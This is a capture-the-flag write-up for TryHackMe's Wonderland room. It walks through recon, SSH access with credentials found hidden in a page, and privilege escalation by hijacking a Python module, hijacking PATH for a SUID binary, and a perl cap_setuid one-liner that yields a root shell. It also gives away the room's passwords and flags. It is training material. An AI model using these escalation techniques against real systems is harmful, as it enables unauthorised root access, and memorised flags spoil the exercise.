---
description: Wonderland box from TryHackMe! write up.
---

# Wonderland

[Link to the room](https://tryhackme.com/room/wonderland)

## Nmap scan

```
# Nmap 7.91 scan initiated Mon Mar  8 11:54:32 2021 as: nmap -sC -sV -oN nmap.txt 10.10.176.220
Nmap scan report for 10.10.176.220
Host is up (0.082s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar  8 11:54:54 2021 -- 1 IP address (1 host up) scanned in 21.96 seconds
```

## Gobuster scan

I noticed that maybe that `r` directory could end up forming a word so i started scanning:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.176.220/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/08 11:57:50 Starting gobuster
===============================================================
/img (Status: 301)
/r (Status: 301)
===============================================================
2021/03/08 11:59:29 Finished
===============================================================
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.176.220/r
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/08 12:00:12 Starting gobuster
===============================================================
/a (Status: 301)
===============================================================
2021/03/08 12:01:10 Finished
===============================================================
```

At the end, the url looks like form "rabbit": http://10.10.176.220/r/a/b/b/i/t/

## Looking around the rabbit hole

After getting into http://10.10.176.220/r/a/b/b/i/t/ and inspecting the page i found a hidden p tag with this in it:

```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

Maybe ssh password (?)

## SSH access


### alice

Well looks like it is. I could get access to the machine through ssh using the above credentials yeah!

Ok in `/home/alice` directory i found `root.txt` and `walrus_and_the_carpenter.py`. That last python file can be executed as the user `rabbit`. It just print random lines of a poem.

```
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The file have the next line `import random` which is a relative path so... i think we can work with that. I just wrote a little fake `random.py` file with the next content:


```
import pty

def choice(something_about_a_poem):
        pty.spawn("/bin/bash")
        exit()
```

Executing `walrus_and_the_carpenter.py` now as `sudo -l` showed, will execute our fake random module and give us access to `rabbit` user:

```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ 
```

### rabbit

I like to run `HOME=/home/$USER` to have the right user home directory configured in the shell.

Looks like `rabbit` has access to a SUID executable: `teaParty`. It ask you for something nice but just core dump for some reason.

I decided to download the file to my machine so i just passed the file to `alice` and download it. It is not stripped so that is cool for looking inside hehe

Ok this is funny:

```
void main(void)

{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```

First the program just print the core dumped error, lmao. Second, it set the uid to 1003 (probably the `hatter` user).

I can see that the program uses the command `date` inside the `system` function with a relative PATH. Adding `/home/rabbit` to `rabbit` PATH: `PATH="$HOME:$PATH"` and creating `date` script in it with something... funny in it will do i think. (Remember to execute `chmod a+x date` to allow the system to run the script)

Lets try it, this is my `date` script:

```
#! /bin/sh

bash -p
```

And...

```
rabbit@wonderland:~$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:~$
```

Nice!

### hatter

I found a `passwd.txt` in `hatter` home directory. It contain `WhyIsARavenLikeAWritingDesk?` that is hatter password so we got to a "checkpoint":

`hatter:WhyIsARavenLikeAWritingDesk?`

We can now conect to hatter account directly.

Looks like the user flag is not here neither. Alice had the `root.txt` file in her directory, could be possible that we can just read `/root/user.txt` or something? In wonderland the things are a bit weird so lets try i dont know:

```
hatter@wonderland:~$ cat /root/user.txt
thm{"Curiouser and curiouser!"}
```

So.. we got the user flag, nice (Totally on porpouse) lets go for the root one.

After i while i decided to execute `linpeas` and i saw something interesting:

```
Files with capabilities:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

Perl can manipulate the process UID so... lets try something:

```
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";'
root@wonderland:~# 
```

Jackpot! We are root, lets get that root flag with `cat /home/alice/root.txt`:

`thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`
